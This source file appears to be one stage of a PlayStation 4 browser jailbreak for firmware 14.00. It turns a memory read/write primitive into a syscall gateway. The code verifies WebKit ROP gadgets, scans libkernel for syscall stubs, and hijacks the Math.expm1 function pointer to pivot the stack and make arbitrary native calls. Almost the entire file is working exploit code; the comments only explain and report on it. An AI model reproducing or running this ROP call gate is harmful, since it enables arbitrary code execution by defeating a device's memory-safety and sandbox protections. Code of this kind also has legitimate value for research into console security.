// fcall.js -- the browser-facing half of the 14.00 probe: turns a memory
// primitive into a syscall gateway, and says out loud whether the pieces it
// needs are where the table claims they are.
//
// Ported from raw13g jb.js:349-542 (gadget gate -> stub table -> makeCtx /
// layout / callAddr -> sc / bufAddr / errno). Three deliberate changes:
//
//   1. The gadget gate reports instead of aborting. A bad byte names the
//      gadget, its RVA and the byte it found; jb.js only counted.
//   2. Stub discovery does not trust off.k_scan_stage1. 14.00 sets
//      k_stubs: undefined and inherits 13.52's 0x40000 bound, so a build whose
//      libkernel text moved leaves every stub outside the window and the scan
//      says "missing" with no clue why. discoverStubs() runs seeds -> stage1 ->
//      a bounded fallback window, and every exit reports where it stopped.
//   3. Nothing is imported. boot.js injects p, the offset table and int64,
//      which is what lets this module be tested against a mock `p` in node.
//
// What this module writes: only buffers it allocated itself (the ROP stack, the
// pivot and store buffers) and the two JSFunction slots the call gate borrows.
// disarm() puts the borrowed slot back. It never writes to device memory.

// ---------------------------------------------------------------- constants

// 48 c7 c0 <imm32> -- "mov rax, imm32". The imm32 is the syscall number, and
// the stub continues 49 ... (mov r9, ...) which is why byte 7 is checked too.
const STUB_MOV_RAX = 0xc0c748;
const STUB_TAIL = 0x49;

const DEFAULT_SCAN = 0x40000; // 13.52's bound, used only if the table lacks one
const DEFAULT_MAX_RVA = 0x200000;
const DEFAULT_MAX_READS = 49152; // 16-byte stride => 768 KB of window

// JSValue for undefined on PS4: tag 0xfffffff7, payload 0x0a.
const UNDEF_TAG = 0xfffffff7;
const UNDEF_PAYLOAD = 0x0a;

// ---------------------------------------------------------------- int64

// Fallback only. When boot.js has the chain's int64 it is injected and used
// instead, so the objects this module builds are the same type p.write8
// already knows how to unpack.
function I64(low, hi) {
  this.low = low >>> 0;
  this.hi = hi >>> 0;
}

I64.prototype.add32 = function (v) {
  const lo = (this.low + v) >>> 0;
  return new I64(lo, lo < this.low ? (this.hi + 1) >>> 0 : this.hi);
};

I64.prototype.sub32 = function (v) {
  const lo = (this.low - v) >>> 0;
  return new I64(lo, lo > this.low ? (this.hi - 1) >>> 0 : this.hi);
};

I64.prototype.toString = function (radix) {
  const r = radix || 16;
  return (
    (this.hi >>> 0).toString(r) +
    (this.low >>> 0).toString(r).padStart(8, "0")
  );
};

export function hex(v) {
  if (v === undefined || v === null) return "(none)";
  if (typeof v === "number") return "0x" + (v >>> 0).toString(16);
  return (
    "0x" +
    (v.hi >>> 0).toString(16).padStart(8, "0") +
    (v.low >>> 0).toString(16).padStart(8, "0")
  );
}

// A module base is only believable if it is above 4 GB and 0x4000-aligned.
// jb.js gates on this; here it is a predicate the caller can report on.
export function looksAligned(v) {
  return !!v && typeof v.low === "number" && v.hi > 0 && (v.low & 0x3fff) === 0;
}

// ---------------------------------------------------------------- gadgets

// Same 15 gadgets, same order, same patterns as jb.js. G4's fourth byte is the
// table's stack-pivot offset, not a constant: if pivot_view_sp moves, the
// gadget's encoding moves with it, and a table that disagrees with the module
// fails here instead of pivoting into the wrong field later.
export function gadgetTable(off) {
  const pv = off ? off.pivot_view_sp : undefined;
  const pivotByte =
    typeof pv === "number" && pv >= 0 && pv <= 0xff ? pv & 0xff : null;

  return [
    ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI_RET", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX_RET", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX_RET", "wk_POP_RCX_RET", [0x59, 0xc3]],
    // 41 58 / 41 59: the REX prefix is not checked, only the payload.
    ["POP_R8_RET", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9_RET", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["POP_RAX_RET", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["LEAVE_RET", "wk_LEAVE_RET", [0xc9, 0xc3]],
    ["MOV_RDI_RAX_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, pivotByte]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
  ];
}

// Reads each gadget's bytes out of the module and keeps only the ones that
// match. Returns every address it accepted, every one it rejected with the byte
// it found, and ok only when all 15 are present -- a partial table is a report,
// never a licence to call.
export function verifyGadgets(p, off, webkitBase, opts) {
  const o = opts || {};
  const table = gadgetTable(off);
  const addr = {};
  const bad = [];
  const warnings = [];

  if (!p || typeof p.read1 !== "function")
    throw new TypeError("fcall.verifyGadgets: p.read1 missing");
  if (!webkitBase || typeof webkitBase.add32 !== "function")
    throw new TypeError("fcall.verifyGadgets: webkitBase missing");

  const pivotEntry = table.find(function (g) {
    return g[0] === "G4";
  });
  if (pivotEntry && pivotEntry[2][3] === null)
    warnings.push(
      "pivot_view_sp is not a byte -- G4 verified on 3 of 4 bytes",
    );

  for (const entry of table) {
    const name = entry[0];
    const key = entry[1];
    const pat = entry[2];
    const rva = off ? off[key] : undefined;

    if (typeof rva !== "number" || !Number.isFinite(rva) || rva < 0) {
      bad.push({ name: name, key: key, rva: rva, reason: "no rva in the table" });
      continue;
    }

    const at = webkitBase.add32(rva);
    const got = [];
    let mismatch = -1;

    for (let i = 0; i < pat.length; i++) {
      if (pat[i] === null) {
        got.push(null);
        continue;
      }
      let b;
      try {
        b = p.read1(at.add32(i)) & 0xff;
      } catch (e) {
        mismatch = i;
        got.push("fault");
        break;
      }
      got.push(b);
      if (b !== (pat[i] & 0xff)) {
        mismatch = i;
        break;
      }
    }

    if (mismatch < 0) addr[name] = at;
    else
      bad.push({
        name: name,
        key: key,
        rva: rva,
        address: at,
        at: mismatch,
        want: pat.slice(),
        got: got,
      });
  }

  const total = table.length;
  const gated = Object.keys(addr).length;

  if (o.requireAll !== false && gated !== total)
    warnings.push("gadget gate is short: " + gated + "/" + total);

  return { ok: gated === total, gated: gated, total: total, addr: addr, bad: bad, warnings: warnings };
}

export function gadgetReportText(gate) {
  if (gate.ok) return gate.gated + "/" + gate.total + " verified";
  const names = gate.bad.map(function (b) {
    return b.name + (b.reason ? "(" + b.reason + ")" : "@" + b.at);
  });
  return gate.gated + "/" + gate.total + "  bad=" + names.join(",");
}

// ---------------------------------------------------------------- stubs

// Returns the syscall number a stub encodes, or -1 if the bytes at v are not a
// stub at all. Both halves of the check matter: the mov rax,imm32 must be there
// *and* the imm must equal the number we are looking for, otherwise the scan
// would happily "find" 0x49c0c748-shaped constants all over .text.
export function stubNumber(v) {
  if (!v || typeof v.low !== "number" || typeof v.hi !== "number") return -1;
  if ((v.low & 0x00ffffff) !== STUB_MOV_RAX) return -1;
  if (((v.hi >>> 24) & 0xff) !== STUB_TAIL) return -1;
  return ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
}

export function stubBytes(num) {
  const n = num >>> 0;
  return [
    0x48,
    0xc7,
    0xc0,
    n & 0xff,
    (n >>> 8) & 0xff,
    (n >>> 16) & 0xff,
    (n >>> 24) & 0xff,
    0x49,
  ];
}

// Three passes, in order of how much they are allowed to assume:
//
//   seeds   -- off.k_stubs, when the table has one. Free, but 14.00 has none.
//   stage1  -- [0, k_scan_stage1), the window every shipped table has used.
//   fallback-- [k_scan_stage1, min(k_scan_stage1*4, 2 MB)), bounded by a read
//              budget and abandoned on the first fault.
//
// The reason the fallback exists is the whole point of this file: 14.00's table
// inherits 13.52's bound while its kernel moved, so a "missing" verdict from
// stage1 alone would be indistinguishable from a wrong libkernel base. Here the
// report separates the two: stopped=null with missing left means the window was
// searched and the stubs are not in it; stopped={reason:"read-fault"} means the
// base is wrong.
export function discoverStubs(p, off, libkernelBase, want, opts) {
  const o = opts || {};

  if (!p || typeof p.read8 !== "function")
    throw new TypeError("fcall.discoverStubs: p.read8 missing");
  if (!libkernelBase || typeof libkernelBase.add32 !== "function")
    throw new TypeError("fcall.discoverStubs: libkernelBase missing");

  const stride = o.stride || 16;
  const declared = off ? off.k_scan_stage1 : undefined;
  const stage1 =
    o.stage1 !== undefined && o.stage1 !== null
      ? o.stage1
      : typeof declared === "number" && declared > 0
        ? declared
        : DEFAULT_SCAN;

  const maxRva = o.maxRva || DEFAULT_MAX_RVA;
  const fallbackEnd =
    o.fallbackEnd !== undefined && o.fallbackEnd !== null
      ? Math.min(o.fallbackEnd, maxRva)
      : Math.min(stage1 * 4, maxRva);
  const maxReads = o.maxReads || DEFAULT_MAX_READS;

  const wantSet = new Set(want || []);
  const found = new Map();
  const badSeeds = [];
  const stats = { seeded: 0, scanned: 0, fallbackScanned: 0, reads: 0 };
  let stopped = null;

  const missing = function () {
    const out = [];
    wantSet.forEach(function (n) {
      if (!found.has(n)) out.push(n);
    });
    return out;
  };

  // -- pass 0: seeds
  const seededFrom = off && off.k_stubs;
  if (seededFrom && typeof seededFrom === "object") {
    for (const key in seededFrom) {
      const num = +key;
      const rva = seededFrom[key];
      if (!Number.isFinite(rva) || rva < 0) continue;
      let v;
      try {
        v = p.read8(libkernelBase.add32(rva));
      } catch (e) {
        badSeeds.push({ num: num, rva: rva, reason: "read-fault" });
        continue;
      }
      const seen = stubNumber(v);
      if (seen !== num) {
        badSeeds.push({ num: num, rva: rva, seen: seen });
        continue;
      }
      found.set(num, libkernelBase.add32(rva));
      stats.seeded++;
    }
  }

  // -- passes 1 and 2
  function scan(from, to, phase) {
    const key = phase === "stage1" ? "scanned" : "fallbackScanned";
    for (let rva = from; rva < to; rva += stride) {
      if (stats.reads >= maxReads) {
        stopped = { phase: phase, rva: rva, reason: "read-budget" };
        return;
      }
      let v;
      try {
        v = p.read8(libkernelBase.add32(rva));
      } catch (e) {
        stopped = {
          phase: phase,
          rva: rva,
          reason: "read-fault",
          error: (e && e.message) || String(e),
        };
        return;
      }
      stats.reads++;

      const num = stubNumber(v);
      if (num < 0 || !wantSet.has(num) || found.has(num)) continue;
      found.set(num, libkernelBase.add32(rva));
      stats[key]++;
      if (missing().length === 0) return;
    }
  }

  if (missing().length) scan(0, stage1, "stage1");

  let fallbackRan = false;
  if (missing().length && o.fallback !== false && stage1 < fallbackEnd && !stopped) {
    fallbackRan = true;
    scan(stage1, fallbackEnd, "fallback");
  }

  const miss = missing();
  const report = {
    ok: miss.length === 0,
    found: found,
    missing: miss,
    seeded: stats.seeded,
    scanned: stats.scanned,
    fallbackScanned: stats.fallbackScanned,
    reads: stats.reads,
    window: { stage1: stage1, fallbackEnd: fallbackEnd, stride: stride },
    declaredStage1: typeof declared === "number" ? declared : null,
    fallbackRan: fallbackRan,
    fallbackUsed: stats.fallbackScanned > 0,
    stopped: stopped,
    badSeeds: badSeeds,
  };

  report.text = stubReportText(report);
  return report;
}

export function stubReportText(r) {
  let out =
    "seeded=" +
    r.seeded +
    " stage1=" +
    r.scanned +
    (r.fallbackScanned ? " fallback=" + r.fallbackScanned : "") +
    " reads=" +
    r.reads;

  if (r.declaredStage1 !== null && r.fallbackScanned)
    out += " (declared window " + hex(r.declaredStage1) + " was short)";
  if (r.fallbackRan && !r.fallbackScanned && !r.stopped)
    out += " (fallback window searched to " + hex(r.window.fallbackEnd) + ", empty)";
  if (r.stopped)
    out += " stopped=" + r.stopped.phase + "@" + hex(r.stopped.rva) + "/" + r.stopped.reason;
  if (r.missing.length) out += " missing=" + r.missing.join(",");
  if (r.badSeeds.length) out += " badSeeds=" + r.badSeeds.length;

  return out;
}

// ---------------------------------------------------------------- call gate

// Everything below is jb.js's call gate, minus its globals. p.m_function of
// Math.expm1 is borrowed for the lifetime of this object: while it is armed,
// any real call to Math.expm1 in the page goes through G0. That is acceptable
// for a page whose only job is to make these calls, and disarm() gives the slot
// back when the run is over.
export function buildCaller(deps) {
  const d = deps || {};
  const p = d.p;
  const off = d.off || {};
  const I = d.int64 || I64;
  const keepAlive = d.keepAlive || [];
  const gadgets = d.gadgets || {};
  const errorFn = d.errorFn;

  if (!p || typeof p.read8 !== "function" || typeof p.write8 !== "function" || typeof p.leakval !== "function")
    throw new TypeError("fcall.buildCaller: p needs read8/write8/leakval");
  if (typeof off.pivot_view_sp !== "number")
    throw new TypeError("fcall.buildCaller: off.pivot_view_sp missing");
  if (typeof off.wk_JSFunction_m_function !== "number")
    throw new TypeError("fcall.buildCaller: off.wk_JSFunction_m_function missing");
  if (!d.stubs || typeof d.stubs.get !== "function")
    throw new TypeError("fcall.buildCaller: a stub map is required");

  const NEEDED = [
    "POP_RDI_RET",
    "POP_RSI_RET",
    "POP_RDX_RET",
    "POP_RCX_RET",
    "POP_R8_RET",
    "POP_R9_RET",
    "POP_RAX_RET",
    "LEAVE_RET",
    "MOV_RDI_RAX_RET",
    "G0",
    "G1",
    "G2",
    "G3",
    "G4",
    "G5",
  ];
  const absent = NEEDED.filter(function (n) {
    return !gadgets[n];
  });
  if (absent.length)
    throw new Error("fcall.buildCaller: gadget(s) missing: " + absent.join(","));

  const G = gadgets;
  const UNDEF = new I(UNDEF_PAYLOAD, UNDEF_TAG);

  function bufAddr(ab) {
    const c = p.leakval(ab);
    const impl = p.read8(c.add32(off.wk_ArrayBuffer_m_impl));
    return p.read8(impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
  }

  function put(dv, at, v) {
    if (typeof v === "number") {
      dv.setUint32(at, v >>> 0, true);
      dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
      dv.setUint32(at, v.low >>> 0, true);
      dv.setUint32(at + 4, v.hi >>> 0, true);
    }
  }

  // The pivot buffer must be big enough to hold the stack pointer at
  // pivot_view_sp, and G4 reads a byte at pivot_view_sp -- so a table whose
  // offset is >= 0x100 cannot be encoded and is rejected above.
  const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);

  function makeCtx() {
    const sb = new ArrayBuffer(0x20);
    const pb = new ArrayBuffer(PB_SIZE);
    const kb = new ArrayBuffer(0x2000);
    const fb = new ArrayBuffer(0x40);
    keepAlive.push(sb, pb, kb, fb);

    const c = {
      storeDv: new DataView(sb),
      pivotDv: new DataView(pb),
      stackDv: new DataView(kb),
      frameDv: new DataView(fb),
      stackU8: new Uint8Array(kb),
      frameU8: new Uint8Array(fb),
    };
    keepAlive.push(
      c.storeDv,
      c.pivotDv,
      c.stackDv,
      c.frameDv,
      c.stackU8,
      c.frameU8,
    );

    c.S = bufAddr(sb);
    c.P = bufAddr(pb);
    c.K = bufAddr(kb);
    c.F = bufAddr(fb);

    // The store cell the armed G0 lands on, and the two-stage pivot.
    put(c.storeDv, 0x00, G.G1);
    put(c.storeDv, 0x08, c.P);
    put(c.storeDv, 0x10, G.G3);
    put(c.storeDv, 0x18, G.G2);

    put(c.pivotDv, 0x00, c.P);
    put(c.pivotDv, 0x10, G.G5);
    put(c.pivotDv, 0x20, G.G4);

    return c;
  }

  const argGadget = [
    G.POP_RDI_RET,
    G.POP_RSI_RET,
    G.POP_RDX_RET,
    G.POP_RCX_RET,
    G.POP_R8_RET,
    G.POP_R9_RET,
  ];

  // One frame per call, built high in the 8 KB stack buffer and grown downward:
  //   pop rdi; <arg0>; pop rsi; <arg1>; ... <target>; pop rdi; <frame>;
  //   mov [rdi], rax; pop rax; undefined; leave; ret
  // The epilogue writes the return value into the frame buffer, stashes
  // undefined in rax to keep it from looking like an object, and unwinds.
  function layout(c, target, args) {
    if (args.length > argGadget.length)
      throw new Error(
        "fcall: " + args.length + " args, the gate carries " + argGadget.length,
      );

    c.stackU8.fill(0);
    c.frameU8.fill(0);

    const insts = [];
    for (let i = 0; i < args.length; ++i) {
      insts.push(argGadget[i]);
      insts.push(args[i]);
    }
    const targetIdx = insts.length;
    insts.push(target);
    insts.push(G.POP_RDI_RET);
    insts.push(c.F);
    insts.push(G.MOV_RDI_RAX_RET);
    insts.push(G.POP_RAX_RET);
    insts.push(UNDEF);
    insts.push(G.LEAVE_RET);

    let at = 0x2000 - 8 * insts.length;
    // System V wants the stack 16-byte aligned at the call; the ret slot is the
    // one that has to be, so nudge the whole frame by 8 when the parity is off.
    if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;

    for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);

    // The pivot lands on the *frame base*, not on the call target: G5 does
    // push rdx; pop rsp; ret, so the ret that follows pops insts[0] -- the first
    // pop -- as its return address and leaves rsp on arg0.
    put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));

    return { at: at, targetAt: at + 8 * targetIdx, length: insts.length };
  }

  const M = makeCtx();
  const cell = d.cell || p.leakval(Math.expm1);
  const mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
  const mainOrig = p.read8(mainMf);

  const pivotObj = {};
  keepAlive.push(pivotObj);
  const pivotCell = p.leakval(pivotObj);

  let armed = false;

  function callAddr(target, args) {
    layout(M, target, args);
    const saved = p.read8(pivotCell);
    p.write8(pivotCell, M.S);
    Math.expm1(pivotObj);
    p.write8(pivotCell, saved);
    return {
      lo: M.frameDv.getUint32(0, true),
      hi: M.frameDv.getUint32(4, true),
      i32: M.frameDv.getUint32(0, true) | 0,
    };
  }

  function sc(num, ...a) {
    const target = d.stubs.get(num);
    if (!target)
      throw new Error("fcall: syscall " + num + " has no verified stub");
    return callAddr(target, a);
  }

  function errno() {
    if (!errorFn) return -1;
    const r = callAddr(errorFn, []);
    return errnoAt(p, r.lo, r.hi, I);
  }

  function arm() {
    if (armed) return;
    p.write8(mainMf, G.G0);
    armed = true;
  }

  function disarm() {
    if (!armed) return;
    p.write8(mainMf, mainOrig);
    armed = false;
  }

  arm();

  return {
    sc: sc,
    callAddr: callAddr,
    bufAddr: bufAddr,
    errno: errno,
    layout: layout,
    arm: arm,
    disarm: disarm,
    isArmed: function () {
      return armed;
    },
    ctx: M,
    cell: cell,
    mainMf: mainMf,
    pivotCell: pivotCell,
    I64: I,
  };
}

// errno() reads a *pointer* out of the frame and then the int behind it. 0/0
// means __error had nothing to say, and jb.js reports that as -1.
export function errnoAt(p, lo, hi, I) {
  const a = new I(lo, hi);
  if (a.hi === 0 && a.low === 0) return -1;
  return p.read4(a) | 0;
}
